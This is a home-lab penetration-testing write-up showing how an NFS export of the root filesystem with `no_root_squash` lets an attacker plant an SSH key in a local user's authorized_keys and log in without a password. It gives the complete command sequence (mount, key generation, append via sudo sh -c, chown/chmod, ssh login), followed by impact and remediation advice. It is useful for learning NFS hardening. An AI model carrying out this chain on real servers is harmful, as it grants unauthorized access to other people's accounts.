# NFS `no_root_squash` SSH Key Privilege Escalation

## Overview

Following the creation of an intentionally vulnerable NFS server exporting `/` with `no_root_squash` in my home penetration-testing lab, I assessed the server from Kali Linux by using the mount itself to escalate from "root on an unrelated machine" to "a valid SSH account on the server," with no prior credentials.

The objective was to practise a complete exploitation chain for NFS `no_root_squash` misconfigurations: confirming the privilege the export grants, identifying a target account, and using write access through the mount to plant a trusted SSH key.

> **Scope:** All testing documented here was performed against systems in my isolated home lab. The NFS server was deliberately configured to be vulnerable for training purposes.

---

## Lab Scope

| System        | Role       | IP Address      |
| ------------- | ---------- | --------------- |
| Kali Linux    | Attacker   | `192.168.50.10` |
| Ubuntu Server | NFS target | `192.168.50.20` |

The server was already known, from the preceding exercise, to export `/` with `rw` and `no_root_squash` to `192.168.50.10`. The objective of this stage was to determine what an attacker could actually do with that access.

---

# 1. Mounting the Export

With the export already confirmed via `showmount -e` in the previous exercise, I mounted it directly:

```
sudo mkdir -p /mnt/nfs-root
sudo mount -t nfs 192.168.50.20:/ /mnt/nfs-root
```

This mounted the server's entire filesystem at `/mnt/nfs-root` on Kali. Listing the top level confirmed the full directory structure was visible:

```
ls -la /mnt/nfs-root
```

`/etc`, `/home`, `/root`, and `/var` were all present through the single mount point — a direct consequence of exporting `/` rather than a scoped subdirectory.

---

# 2. Identifying a Target Account

I enumerated local accounts on the server by listing home directories through the mount:

```
sudo ls -la /mnt/nfs-root/home
```

I selected an ordinary user account (`nosheena`) rather than targeting `root` directly, to demonstrate that the technique compromises *any* local account reachable through `/home`, not only root's own files.

I then checked the target's existing `.ssh` configuration:

```
sudo ls -la /mnt/nfs-root/home/nosheena/.ssh
```

An `.ssh` directory already existed for the account, which meant SSH key-based authentication was already enabled at the service level — the only missing piece was a trusted key in `authorized_keys`.

---

# 3. Generating an Attack Keypair

I generated a dedicated keypair on Kali rather than reusing an existing one, to keep the exercise self-contained:

```
ssh-keygen -t ed25519 -f ~/nfs_exploit_key -N ""
```

This produced `nfs_exploit_key` (private) and `nfs_exploit_key.pub` (public) in my home directory, with no passphrase, so the subsequent login would not require any interactive credential.

---

# 4. Writing the Key via the Mount

I checked the existing contents of `authorized_keys` before writing to it:

```
sudo cat /mnt/nfs-root/home/nosheena/.ssh/authorized_keys
```

I then appended my public key through the mount, as root:

```
sudo sh -c 'cat /home/<kali-user>/nfs_exploit_key.pub >> /mnt/nfs-root/home/nosheena/.ssh/authorized_keys'
```

The write had to be wrapped in `sh -c '...'` because `sudo` only elevates the command it is given (`cat`) and not a shell redirection (`>>`) that follows it. Without the wrapper, the `>>` redirection would still be performed by my unprivileged user, which has no write access to another account's home directory on the mounted filesystem.

---

# 5. Matching Ownership and Permissions

`sshd` enforces strict permission checks on `authorized_keys`, `.ssh`, and the home directory itself, and will silently ignore a key that does not meet them. I confirmed the target's correct numeric ownership:

```
sudo stat -c '%u %g' /mnt/nfs-root/home/nosheena
```

and applied matching ownership and restrictive permissions to the file I had just written:

```
sudo chown 1000:1000 /mnt/nfs-root/home/nosheena/.ssh/authorized_keys
sudo chmod 600 /mnt/nfs-root/home/nosheena/.ssh/authorized_keys
```

This made the planted key indistinguishable, from `sshd`'s perspective, from one the legitimate user had added themselves.

---

# 6. Authenticating as the Target User

With the key in place, I connected from Kali using the private half of the keypair:

```
ssh -i ~/nfs_exploit_key nosheena@192.168.50.20
```

The login succeeded immediately, with no password prompt and no prior credentials for the `nosheena` account. This confirmed the full chain: root-level write access through an over-exposed, `no_root_squash` NFS mount was sufficient on its own to obtain an interactive login as a different local user on the server.

---

# Finding: NFS `no_root_squash` Enabling SSH Key-Based Privilege Escalation

## Description

The NFS server exported `/` with `rw` and `no_root_squash` to the attacker machine. This allowed root on the NFS client to write to the server's filesystem with genuine root privileges, rather than having that identity remapped to an unprivileged user.

## Evidence

Root on Kali wrote a trusted public key directly into a local user's `authorized_keys` file via the mounted export:

```
sudo sh -c 'cat nfs_exploit_key.pub >> /mnt/nfs-root/home/nosheena/.ssh/authorized_keys'
```

A subsequent SSH connection using the corresponding private key succeeded without a password:

```
ssh -i ~/nfs_exploit_key nosheena@192.168.50.20
```

## Security Impact

An attacker with root access to any machine permitted to mount a `no_root_squash` export of `/` can:

- Read any file on the server's filesystem, including configuration files, credentials, and other users' data.
- Write to any file the server's underlying filesystem permissions allow root to write to, which in practice means effectively any file.
- Plant SSH keys in any local account's `authorized_keys`, gaining an interactive login as that user without ever obtaining or guessing a password.
- Repeat the same technique against the `root` account's own `authorized_keys`, if present, for direct root-level SSH access.

The vulnerability does not require any flaw in SSH itself — SSH behaved exactly as designed. The weakness is entirely in the NFS export configuration, which allowed an untrusted client to assert root identity and write into a location SSH implicitly trusts.

## Remediation

- Never export `/` or other broad, high-value paths over NFS. Scope exports to the minimum directory required.
- Retain `root_squash` (the default) unless there is a specific, documented, and justified reason to disable it.
- Restrict exports to specific authorised hosts by IP, as was done in this lab (`192.168.50.10` only).
- Where client-asserted UIDs cannot be trusted at all, consider `all_squash` so that no client identity maps to a privileged server-side account.
- For environments requiring stronger assurance than UID-based trust, use NFSv4 with Kerberos (`sec=krb5p`), which authenticates principals cryptographically rather than trusting client-supplied UIDs.
- Periodically audit `/etc/exports` for options that were enabled temporarily (for testing or troubleshooting) and never reverted.

---

# Key Lessons

- `root_squash` is the specific control that prevents this entire attack chain; disabling it has consequences far beyond the directory it is applied to.
- The scope of the export matters as much as the `root_squash` setting itself — `no_root_squash` on a narrow, purpose-specific directory is a smaller exposure than `no_root_squash` on `/`.
- NFS misconfiguration can lead directly to SSH-level account compromise without touching SSH's own configuration or exploiting any SSH vulnerability.
- `sudo` only elevates the specific command it precedes; shell redirections after it still run as the invoking user, which matters when writing into root-owned or other-user-owned paths.
- `sshd`'s strict permission checking on `authorized_keys` means an attacker must match legitimate ownership and permissions exactly, which a `no_root_squash` NFS mount conveniently allows.

---

# Assessment Summary

Starting from a server already known to export `/` with `no_root_squash`, I mounted the export as root from Kali, identified a target local account, and used write access through the mount to plant a trusted SSH key in that account's `authorized_keys`. After matching the file's ownership and permissions to what `sshd` expects, I authenticated directly as that user with no password and no prior access to the account.

This demonstrated that an NFS `no_root_squash` misconfiguration is not merely a file-sharing inconvenience but a direct path to account compromise on the exporting server, turning root access to any permitted client machine into an interactive login on the NFS server itself.

---

## Related Lab

For the server-side configuration and the `root_squash`/`no_root_squash` comparison that preceded this exercise, see:

`04-vulnerable-nfs-server.md`
